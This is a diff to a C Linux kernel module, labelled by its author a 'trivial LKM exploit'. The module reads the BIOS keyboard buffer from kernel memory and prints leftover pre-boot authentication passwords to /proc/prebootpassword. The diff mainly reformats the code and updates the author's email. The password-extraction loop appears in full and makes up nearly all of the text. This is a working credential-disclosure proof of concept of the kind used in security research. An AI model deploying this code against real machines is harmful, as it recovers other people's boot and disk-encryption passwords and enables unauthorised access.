@@ -2,7 +2,7 @@
 *
 * Trivial LKM exploit to display the content of BIOS Keyboard buffer in /proc/prebootpassword .
 *
-* // Jonathan Brossard - jonathan@ivizindia.com - endrazine@gmail.com
+* // Jonathan Brossard - jb@endrazine.com - endrazine@gmail.com
 *
 */
 
@@ -41,24 +41,31 @@ static int sploit_read_pass( char *page, char **start, off_t off, int count, int
 	/* buffer starts at kernel base address + BiosKeyboardBuffer */
 	sprintf(tab, "%s", BiosKeyboardBuffer + PAGE_OFFSET );
 
-	for (j = 0; j < 16; j++) {		tab2[i] = tab[2 * j];		i++;		
+	for (j = 0; j < 16; j++) {
+		tab2[i] = tab[2 * j];
+		i++;
+		
 		if (tab2[i] <= 0x7e && tab2[i] >= 0x30 )
 			password_flag = 1;
 	}
 
-	if (!password_flag) {		len=sprintf(page, "No password found\n");
+	if (!password_flag) {
+		len=sprintf(page, "No password found\n");
 		return len;
 	} else {
 		len=sprintf(page, "Password to the latest pre boot authentication software) : ");
-			for (i = 0; i < 16; i++) {
+	
+		for (i = 0; i < 16; i++) {
 
 			/*
 			* We might have several passwords concatenated in case of multiple preboot authentication softs
 			*/
-			if ( i<15 && tab2[i] == 0x0d && tab2[i+1] != 0x0d && tab2[i+1] <= 0x7e && tab2[i+1] >= 0x30 ) {				len += sprintf(page, "%s\n--[ Password (to a previous authentication software) :", page);
+			if ( i<15 && tab2[i] == 0x0d && tab2[i+1] != 0x0d && tab2[i+1] <= 0x7e && tab2[i+1] >= 0x30 ) {
+				len += sprintf(page, "%s\n--[ Password (to a previous authentication software) :", page);
 			} else if (tab2[i] <= 0x7e && tab2[i] >= 0x30) {
 				sprintf(page, "%s%c", page, tab2[i]);
-				len++;			} else {
+				len++;
+			} else {
 				break;			
 			}
 		}
